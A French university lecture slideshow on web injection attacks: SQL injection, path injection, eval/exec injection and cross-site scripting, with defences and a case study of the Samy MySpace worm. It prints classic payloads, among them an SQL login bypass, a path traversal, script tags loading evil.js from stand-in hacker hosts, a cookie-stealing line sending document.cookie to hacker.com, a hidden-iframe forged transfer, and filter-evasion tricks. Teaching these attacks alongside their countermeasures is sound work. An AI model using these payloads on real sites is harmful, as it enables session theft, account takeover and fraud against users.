---
layout: slideshow
title: Injections de code
subtitle: Injections SQL, Cross Site Scripting
scripts: ['http://coffeescript.org/extras/coffee-script.js']
---

<section>

## Ne jamais se fier au client

Toutes les données en provenance du client :

- Entêtes HTTP,
- Paramètres de l'URL, *query string*
- Corps de la requête, données des formulaires,
- Cookies, Storage API,

peuvent contenir des valeurs **non valides**, pour plusieurs raisons :

- L'utilisateur a fait une erreur de saisie ;
- Le client n'utilise pas JavaScript ;
- Le client est un robot ;
- L'utilisateur est un hacker qui cible votre site.

Pour toutes ces raisons, le code du server **doit toujours vérifier**
les données envoyées par le client.

</section>
<section>

## J'insiste !

**Vérifiez les données**, même si...

- ...vous utilisez des formulaires HTML5 ;
- ...vos champs/données sont *cachés* ;
- ...vous *validez* vos formulaire avec JavaScript ;
- ...les données sont *générées* de façon programmatique (pas saisies
  par l'utilisateur) par le code client.

Faciles à contourner en **lisant/éditant le source**. Exemple:

<form style="border: solid thin #aaa; border-radius: 5px; box-shadow: 1px 1px 1px #ccc; width: 90%;margin: auto">
Saisissez un nombre : <input pattern="[0-9]*"/><input type="submit" value="Submit">
</form>

Seules les données gérées *entièrement par le server* sont fiables :

- Variables locales, sessions, caches, fichiers, bases de données...

> Ce que vous voyez, n'est pas ce que le hacker voit !
{:.cite}

</section>
<section>

## Notre modèle de sécurité

Nous allons supposer qu'un utilisateur malveillant veut s'attaquer à
notre site. Nous allons faire des hypothèses sur ses moyens :


- Il peut faire **uniquement** des requêtes HTTP(S) au server, à travers
  un browser ou par d'autres moyens, et lire les réponses ;
- Il **connaît le code source** de l'application web (crédible pour une
  application open source) ;
- Il **ne peut pas** intercepter ou modifier une connexion entre un
  autre client et le server ;

Les buts du hacker peuvent être multiples : compromettre le server,
voler des données, ...


</section>
<section>

# Injections SQL

</section>
<section class="compact">

## Un premier exemple

Considérez le code suivant, qui vérifie la connexion d'un utilisateur.

~~~
$user = $req->request->get('user');
$pass = $req->request->get('pass');
$sql = "SELECT * FROM users
        WHERE login='$user' AND password='$pass'";
if ($app['db']->fetchAssoc($sql)) {
  // utilisateur connecté
}
~~~
{:.php}

L'utilisateur envoie les paramètres suivants dans le corps de la requête :

~~~
user=root
pass=' OR '1'='1
~~~

La chaîne `$sql` vaudra alors

~~~
SELECT * FROM users
WHERE login='root' AND password='' OR '1'='1'
~~~

La condition est toujours vérifiée : **le hacker est connecté en tant
que root!**

</section>
<section>

### Que peut-on faire avec les injections SQL ?

- Escalade de droits (se faire passer pour *root*),
- Vol de données (lire la base),
- Compromission de la base de données (effacer/modifier les données).


![](http://imgs.xkcd.com/comics/exploits_of_a_mom.png)
{:.centered style="max-width:100%"}

Et voici une
[liste de attaques par injection SQL documentées](http://en.wikipedia.org/wiki/SQL_injection#Examples).

</section>
<section>

## Contrer les injections SQL

On connaît la solution : **échapper les caractères spéciaux** `'`,  `"`,  `;`

- PHP : `mysqli::real_escape_string`,
- PDO/Doctrine : `PDO::quote`, `Doctrine::quote`,
- Échappement automatique : **requêtes préparées**.

Exemple

~~~
$app['db']->fetchAssoc("SELECT * FROM users
  WHERE login=? AND password=?",
  array($user, $pass)
);
~~~
{:.php}

Résultat

~~~
SELECT * FROM users
WHERE login='root' AND password=''' OR ''1''=''1'
~~~

</section>
<section>

# Autres types d'injection

</section>
<section>

## Injection de chemin

N'écrivez jamais ce code :

~~~
$page = $req->query->get('page');
return $app['twig']->render($page);
~~~
{:.php}

Le hacker pourrait passer un chemin non prévu :

~~~
?page=../../config.php
~~~

et éventuellement lire les données privées du site. Encore pire :

~~~
$page = $req->query->get('page');
include($page);
~~~
{:.php}

Pourrait exécuter du code non sollicité.

</section>
<section>

### Comment se protéger ?

Avoir une *liste des chemins autorisés* :

~~~
$pages = array(
	'un_template.html',
	'autre_template.html',
	...);
	
if ($page in $pages) {
  return $app['twig']->render($page);
} else {
  return new Response(404);
}
~~~
{:.php}

</section>
<section>

## Injection dynamique de code

Techniques permettant d'*exécuter du code arbitraire sur le server*.

- La fonction `eval` exécute du code PHP contenu dans une chaîne
  
  ~~~
  eval($req->query->get('toto'));
  ~~~
  {:.php}

- La fonction `exec` exécute des programmes externes
  
  ~~~
  exec('ls -l ' . $req->query->get('dir'));
  ~~~
  {:.php}

**Contre-mesure :** simplement à éviter !

</section>
<section class="compact">

## Injections de HTML

Les injections dans la sortie HTML générée sont aussi appelées
**Cross-Site Scripting** (XSS).

~~~
$user = $req->cookies->get('user');
return "
<body>
  <h1>Bonjour, $user !</h1>
</body>";
~~~

Le hacker pourrait envoyer le cookie

~~~
user=<script src="http://hacker.org/attack.js"></script>
~~~

Ce qui générerait le code HTML suivant

~~~
<body>
<h1>Bonjour,
<script src="http://hacker.org/attack.js"></script> !</h1>
</body>
~~~

En général, ceci ne constitue pas une **menace** pour le server, mais
**pour l'utilisateur** !

</section>
<section>

### Se protéger de XSS

Échapper les caractères spéciaux : `<`,  `>`,  `&`, `"`, `'`, ...

- Avec la fonction `htmlspecialchars()` de PHP,
- Avec la fonction `$app->escape()` de Silex,
- Par l'échappement automatique de Twig, ou d'un autre moteur de
  templates (voir aussi [Cours 4](class4#chappement-dans-twig)).

#### Résultat

~~~
<body>
<h1>Bonjour,
&lt;script src=&quot;http://hacker.org/attack.js&quot;?gt;&lt;/script&gt; !</h1>
</body>
~~~

</section>
<section>

# Attaques par XSS

</section>
<section>

## Cross site scripting

On estime que 80% des failles de sécurité des application web sont des
failles XSS.

#### Que peut-on faire avec XSS ?

- Changer l'apparence d'une page, la défigurer (recerchez
  [Stallowned](http://www.google.com/search?q=stallowned)).
- Rédiriger et *phisher*.
- Voles des cookies et des données privées !
- Propager l'exploit XSS comme un ver.
- **Controler le browser de la victime !!!**

Les attaques XSS comportent trois acteurs : le client (la victime), le
hacker et le server.

Elles nécessitent d'une part de *social engineering*.

</section>
<section>

## Injections de code

<svg width="1000" height="500" transform="scale(0.8)">
  <defs
     id="defs4">
    <marker
       inkscape:stockid="Arrow1Lend"
       orient="auto"
       refY="0"
       refX="0"
       id="Arrow1Lend"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         style="fill-rule:evenodd;stroke:#000;"
         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
    </marker>
  </defs>
  <g transform="translate(282.72338,-54.173922)">
    <rect
       style="fill:none;stroke:#000;stroke-width:0.6;stroke-dasharray:2.92992042, 0.97664014"
       width="165.71237"
       height="281.82312"
       x="101.18707"
       y="158.82298" />
    <text x="120.39771" y="146.25534">
        <tspan
         x="120.39771"
         y="146.25534">Server</tspan></text>
    <text x="616.16119" y="462.61093"><tspan
         x="616.16119"
         y="462.61093">Client</tspan></text>
    <text
       x="558.67902"
       y="117.28503"><tspan
         x="558.67902"
         y="117.28503">Attaquant</tspan></text>
    <text
       style="font-family:monospace;font-size:smaller"
       x="282.06912"
       y="224.10202"><tspan
         x="282.06912"
         y="224.10202">GET /app?userval=<tspan style="fill:#ff0000;">code</tspan></tspan></text>
    <text
       style="font-family:monospace;font-size:smaller"
       x="282.66431"
       y="366.67291"><tspan
         x="282.66431"
         y="366.67291">POST /app</tspan><tspan
         x="282.66431"
         y="386.67291">....</tspan><tspan
         x="282.66431"
         y="426.67291">userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
    <text
       style="font-family:monospace;font-size:smaller"
       x="282.72018"
       y="280.52457"><tspan
         x="282.72018"
         y="280.52457">GET /app</tspan><tspan
         x="282.72018"
         y="300.52457">...</tspan><tspan
         x="282.72018"
         y="320.52457">Cookie: userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 587.14111,142.36185 c 0,0 -46.11906,44.40322 -75.26205,55.41546 -17.58465,6.64471 -56.17691,4.95028 -56.17691,4.95028 l -218.64195,0" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 612.26865,145.21287 c 0,0 -0.90934,64.1013 -22.17718,83.47753 -21.61431,19.59093 -71.16389,23.1171 -108.06215,27.78481 -70.60874,8.93215 -233.51441,0 -233.51441,0" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 615.82691,433.43399 c 0,0 -72.38793,-16.81896 -108.04451,-34.14738 -24.30416,-11.81136 -46.22842,-45.56561 -72.14732,-47.74327 -70.13283,-5.89243 -185.9292,-4.78941 -185.9292,-4.78941" />
    <text
       style="font-family:monospace;font-size:90%"
       x="115.46939"
       y="224.77438">$req->query</text>
    <text
       style="font-family:monospace;font-size:90%"
       x="103.90759"
       y="335.86218">$req->request</text>
    <text
       style="font-family:monospace;font-size:90%"
       x="90.29983"
       y="262.17676">$req->cookies</text>
    <rect
       style="fill:none;stroke:#000;stroke-dasharray:2.92992042, 0.97664014"
       width="156.95905"
       height="155.05975"
       x="-96.716225"
       y="250.56323" />
    <text
       style="font-size:smaller"
       x="-110.57119"
       y="431.72263">Gestionnaires de requête</text>
    <text
       style="font-size:smaller"
       x="-27.780369"
       y="144.02188"><tspan
         x="-27.780369"
         y="144.02188">Database</tspan></text>
    <path
       style="fill:none;stroke:#000;stroke-width:0.6;"
       d="m -187.55218,232.42253 c 0,7.96786 -10.04769,14.42709 -22.44214,14.42709 -12.39446,0 -22.44214,-6.45923 -22.44214,-14.42709 0,-7.96786 10.04768,-14.42709 22.44214,-14.42709 12.39445,0 22.44214,6.45923 22.44214,14.42709 z"
       transform="translate(219.4877,-65.958513)" />
    <path
       transform="translate(219.07566,-29.036599)"
       style="fill:none;stroke:#000;stroke-width:0.6;"
       d="m -187.55218,232.42253 c 0,7.96786 -10.04769,14.42709 -22.44214,14.42709 -12.39446,0 -22.44214,-6.45923 -22.44214,-14.42709 0,-7.96786 10.04768,-14.42709 22.44214,-14.42709 12.39445,0 22.44214,6.45923 22.44214,14.42709 z" />
    <path
       style="fill:none;stroke:#000;stroke-width:0.6"
       d="m -13.147253,166 0,36" />
    <path
       style="fill:none;stroke:#000;stroke-width:0.6"
       d="m 31.9,166 0,36" />
    <rect
       style="fill:none;stroke:#000"
       width="127.67582"
       height="82.231422"
       x="-222.28365"
       y="126.78767" />
    <rect
       style="fill:#000;stroke:#000;"
       width="111.96162"
       height="65.96067"
       x="-214.99567"
       y="134.07567" />
    <text
       style="font-size:smaller;fill:#ffffff;font-family:monospace;"
       x="-207.70767"
       y="155.93962"><tspan
         x="-207.70767"
         y="155.93962">$ system_</tspan></text>
    <text
       style="font-size:smaller;font-family:Monospace;"
       x="-55.309212"
       y="310.202">$local</text>
    <path
       style="fill:none;stroke:#000;stroke-dasharray:1, 2;stroke-dashoffset:0"
       transform="translate(60,-70) scale(1,1.3)"
       d="m 261.58487,74.673922 c 0,0 101.43142,14.241518 151.50617,36.692898 52.99984,23.76287 96.65917,42.24561 111.26235,87.58951 17.94967,55.73498 25.10441,133.29615 8.28549,189.38271 -10.97445,36.59683 -29.23571,55.85018 -68.65123,75.75309 -44.30646,22.37259 -166.89352,39.06018 -166.89352,39.06018" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 124.68644,201.48955 c 0,0 -23.42052,4.87595 -30.01711,11.30623 C 95.438851,226.66746 69.05891,254.85015 44.335262,267.68877 36.24837,271.88817 9.0105298,281.88653 2.60863e-7,277.40609 -17.224554,268.84128 -9.7173178,219.10218 -9.7173178,219.10218" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 126.11738,346.41552 c -39.274163,0.60733 -84.558795,0.92095 -123.8092389,5.41406 -31.8503901,3.64601 -54.1035391,17.7565 -56.8627841,24.83137 -8.025936,20.57899 29.02049,19.47931 46.992433,19.59046 83.972727,0.51933 196.10141,11.85331 205.26659,13.55175 49.65735,9.20223 26.76604,58.14265 77.251,59.48533 178.08888,4.73641 140.6787,2.80521 318.82953,3.41254" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 629.69752,130.30509 24.85649,287.625" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 247.85188,146.9033 c 0,0 10.59461,0.65494 -10.77617,33.52586 2.57626,20.8974 21.82161,9.34694 29.93381,5.98676 30.24537,-12.52804 41.23105,-52.8444 69.44642,-69.44642 15.02561,-8.84112 33.00171,-12.1119 50.28879,-14.36823 105.68659,-13.794358 216.77251,33.68717 319.693,5.98676 31.99072,-8.610105 85.012,-51.486137 85.012,-51.486137"
       transform="translate(-222.72338,74.173922)" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 338.85064,194.79738 c 0,0 -17.77898,18.6138 -35.92056,26.34175 -18.65457,7.94648 -59.86761,10.77617 -59.86761,10.77617"
       transform="translate(-222.72338,74.173922)" />
    <path
       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
       d="m 141.28755,230.71795 c 0,0 -41.1046,-19.94561 -55.078199,-37.11792 -11.975641,-14.717 -21.552338,-52.68349 -21.552338,-52.68349"
       transform="translate(-222.72338,74.173922)" />
  </g>
</svg>

</section>
<section class="compact">

## Cross Site Scripting

Le Cross Site Scripting (XSS) est l'injection de code HTML/JavaScript
**dans la réponse envoyée au client**.

**Schema de base :** Le server *reflète* les données du client **sans
  filtrer**

~~~
$search = $req->query->get('search');
return "<input type='text' name='search' value='$search' />";
~~~

Le hacker *injecte* le code dans la page web

~~~
http://www.example.com/?
 search='><script src='http://hackers.com/evil.js'></script>
 <br class='
~~~
{:no-highlight}

Résultat

~~~
<input type='text' name='search' value=''>
<script src='http://hackers.com/evil.js'></script>
<br class='' />
~~~
{:.html}

La victime visite `www.example.com`, mais le code JavaScript étranger
`evil.js` s'exécute.

</section>
<section class="compact">

## XSS permanent et reflété

**XSS reflété :** Le code est injecté quand le client visitele lien

- Query string
- Formulaires
- Résultats de recherche

~~~
From: "order-update@amazon.com" <order-update@amazon.com>
Subject: Amazon.com - Your Cancellation (175-2364376-728612)

<html><body>
Your order has been successfully canceled. For your reference,
here's a summary of your order:<br />

You just canceled order <a
href="http://www.amazon.com/?var=<script>injection()</script>">#175-2364376-728612</a>
placed on February 16, 2012. ...
~~~

**XSS permanent :** Le code est stocké sur le server (probablement,
  dans la BD)

- Billets de blog, forums, ...
- Réseaux sociaux.

</section>
<section>

## Palliatif : Cross-domain policy

> À aucun moment un script d'un domaine (par ex. `www.hacker.com`)
> doit pouvoir accéder à partir d'un document au contenu d'un domaine
> diffèrent (par ex.  `www.example.com`).


### La cross-domain policy est mise en place pour

- Cookies ;
- Requêtes AJAX ;
- Contenu de frames et iframes.

### Exceptions (nécessaires)

- Images, audio, vidéos ;
- Scripts ;
- URL des frames et iframes.

</section>
<section>

## Exemple : vol de cookies

Seul le **domaine propriétaire** devrait pouvoir lire ses propres
cookies.

~~~
HTTP/1.1 200 OK
Set-Cookie: sessid=a10340f0e; Domain=www.mybank.com; Path=/; Secure;
~~~
{:.compact}

Si le hacker peut injecter le code suivant

~~~
document.write("<img src='https://hacker.com/ck.php?"
               + document.cookie + "' />");
~~~
{:.compact}

lorsque la victime visite la page ciblée, le hacker reçoit une requête
pour

~~~
https://hacker.com/ck.php?sessid=a10340f0e
~~~

Ce qui lui révèle l'**identifiant de session de la victime**.

</section>
<section>

## Pourquoi `<img>` ?

La balise `<img>` est utilisé souvent pour envoyer des données de la
victime à l'attaquant :

~~~
<img src='https://hacker.com/ck.php?sessid=a10340f0e' />
~~~
{:.compact}

- Presque tous les browsers savent la gérer,
- Connexion silencieuse (pas d'interaction utilisateur, pas de confirmation),
- Rarement filtrée.

</section>
<section class="compact">

## Autre possibilité : `<iframe>`

`<iframe>` permet d'inclure une page dans une autre

~~~
<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)"></iframe>
~~~

<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)" style="width:80%;margin-left:10%" name="if">
</iframe>


JavaScript peut contrôler le comportement de l'iframe :
<input type="button" onclick="window.frames.if.location.href='http://www.w3schools.com/tags/tag_iframe.asp'" value="Changer page" />

~~~
window.frames.hf.location.href =
  'http://www.w3schools.com/tags/tag_iframe.asp';
~~~

Les `<iframes>` *invisibles* peuvent être utilisés pour :

- Faire des requêtes HTTP sans que l'utilisateur s'en aperçoive ;
- Étendre une faille XSS dans une page au site tout entier ;
- Traverser des frontières de domaine.

</section>
<section class="compact">

## Un exemple avec `<iframe>`

- Le hacker injecte le script dans une page vulnérable

~~~
http://www.example.com/vulnerable?
  lang=en"></script src="http://hacker.com/evil.js"></script>
~~~

- Le script ajoute un `<iframe>` caché au document

~~~
document.write(
  '<iframe name="hf" style="display:none"></iframe>');
~~~

- Après quelques seconde, le script génère une requête à une page
  sécurisée

~~~
function req() {
  window.frames.hf.location.href=
    'http://www.example.com/transfer?to=hacker&amount=10000';
}
setTimeout(req, 5000);
~~~
{:.javascript}

- La réponse à `transfer` est envoyée au frame, l'utilisateur
  ne s'est aperçu de rien.

</section>
<section class="compact">

## Comment se protéger

**HTML Entities:** échapper, échapper, échapper !

~~~
<script>alert("XSS");</script>
~~~

~~~
&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
~~~

**Filtrer** (par ex., avec les templates)

~~~
<p>Hi, {{req.query.name}}!</p>
~~~

**Mieux vaut une whitelists qu'une blacklists**

Le code JavaScript peut être inséré dans HTML, CSS, SVG, ... S'il est
nécessaire d'autoriser l'utilisateur à insérer des balises dans le
document, permettez seulement

- Des balises sûres : `<img>`, `<div>`, `<p>`, ...
- Des attributs sûrs : `src`, `href`, `id`, `class`, ...


**Utilisez des bibliothèques de sanitization**

</section>
<section class="compact">

## Contourner les protections

### Utiliser des encodages différents

Exemple de *URL encoding*

~~~
// <script>alert("XSS");</script>
%3Cscript%3Ealert%28%22XSS%22%29;%3C%2Fscript%3E
~~~

Avec les codes ASCII (par ex., 34 est `"`)

~~~
document.write('href=' + String.fromCharCode(34) +
  'http://hacker.com/' + String.fromCharCode(34));
~~~

### Casser les mots clefs filtrés

En supposant que `onload` soit blacklisté :

~~~
var stmt = "window.onl" + "ad = myfunc";
eval(stmt);
~~~

### Exploiter les bugs des browsers (surtout IE)

</section>
<section>

# Étude de cas : le *worm* Samy

</section>
<section>

## Vers XSS : Samy

- Le 11 avril 2005 à 1h un ver basé sur une injection XSS commence à
  se répandre sur MySpace.
- En moins de 24h, plus d'un million de profiles sont infectés.
- MySpace est contraint à fermer le site pendant plusieurs heures pour
  extirper le ver.


#### Comment marche Samy
{: style="margin-bottom: -20px"}

1. MySpace permets une personnalisation limitée de la page de
   profile. Samy découvre qu'il peut inclure du JavaScript dans cette page.
2. Un utilisateur visite un profil infecté, le JavaScript malicieux
   s'exécute dans le browser de l'utilisateur.
3. Le JavaScript malicieux envoi une demande d'amitié à Samy, puis
   ajoute Samy aux *héros* de l'utilisateur.
4. Enfin, le JavaScript malicieux se copie dans le profil de
   l'utilisateur. L'infection peut grandir de façon exponentielle !

Lire l'histoire complète à <http://fast.info/myspace/>.

</section>
<section class="compact">

## Comment a-t-il fait ?

### Injection des scripts

- MySpace bloque `</script>`, `onxxx`, ...
- Mais certains browsers acceptent du JavaScript dans les
  attributs CSS.

~~~
<div style="background:url('javascript:alert(1)')">
~~~

### Imbriquer les guillemets quotes (à mon avis, l'astuce la plus jolie)

- L'astuce précédente a déjà utilisé un guillemet simple `'` et un
  double `"`.
- Samy doit encoder des chaînes en JavaScript, mais MySpace filtre
  `\'` et `\"`.
- Par exemple, Samy ne peut pas écrire :
  
~~~
<div style="background:url('javascript:alert("hah!")')">
<div style="background:url('javascript:alert('hah!')')">
<div style="background:url('javascript:alert(\'hah!\')')">
~~~

- Idée : mettre le source JavaScript dans un autre attribut (utilise
  `document.all`, spécifique à IE).
  
~~~
<div id="mycode" expr="alert('hah!')" style=
  "background:url('javascript:eval(document.all.mycode.expr)')"> 
~~~
{:.compact}

</section>
<section>

### Déclarer le code JavaScript

- MySpace filtre le mot "javascript".
- Samy exploite une "feature" de IE.

~~~
<div ... style="background:url('java
script:eval(...)')">
~~~

### Un peu de encodage et de césures par ci et par là

~~~
console.log('double quote: ' + String.fromCharCode(34));
eval('document.body.inne' + 'rHTML'); 
eval('xmlhttp.onread' + 'ystatechange = callback'); 
~~~
{:.compact}

### GET and POST

- Samy doit générer des requêtes (amitié, modification de profil, ...)
- Il aurait probablement pu utiliser les iframes, mais il a trouvé
  plus simple de générer des requêtes AJAX.


</section>
<section>

### Redirection

- Maintenant Samy est confronté à un *mur cross-domain* (entre
  `profile.myspace.com` et `www.myspace.com`).
- Il rédirige l'utilisateur vers `www.myspace.com`.

~~~
if (location.hostname == 'profile.myspace.com')
  document.location = 'http://www.myspace.com' +
  location.pathname + location.search; 
~~~

### Jetons cachés

- MySpace demande une confirmation avant d'ajouter un ami : il utilise
  un `<input>` caché avec une valeur aléatoire. (Il s'agit d'une
  protection [CSRF](class8)).
- Avec XSS, il est simple de contourner les protections CSRF : Samy
  fait quelques requêtes GET et POST en plus pour simuler
  l'interaction avec l'utilisateur.


**LE code:** <http://fast.info/myspace/>

</section>
<section>

## Frameworks d'injection

### Contrôler le browser de la victime à distance !

- Obtenier de l'information sur les victimes ;
- Accéder au stockage locale ;
- Déclencher des actions ;
- **Canaliser la navigation HTTP !!!**

### Combinent les attaques XSS avec les vulnérabilités des browsers (plus efficaces sur les vieux browsers)

- XSS Framework: <http://code.google.com/p/xssf/>;
- Browser Exploitation Framework: <http://beefproject.com/>.

</section>
<section>

## Le mot de la fin

### Pourquoi XSS existe-t-il ?

- Une confusion entre **données** et **logique** ;
- Une priorité donnée à la **facilité de programmation** plutôt qu'à
  la **sécurité** par les acteurs majeurs.

### XSS ne va pas disparaître bientôt...

**Règle 1 :** Sanitisez vos données !

**Règle 2:** Analysez les flux de données, concevez modulairement.

**Règle 3:** Utilisez des frameworks web.

**Règle 3:** (Si vous êtes un professionnel) Utilisez des outils de
  *penetration testing*.

</section>
<section>

## Lectures

- OWASP foundation wiki <https://www.owasp.org>
- OWASP [WebScarab](https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project) HTTP proxy;
- [Burp Scanner](http://portswigger.net/burp/scanner.html) penetration testing;
- OWASP [WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project) security training platform.

</section>

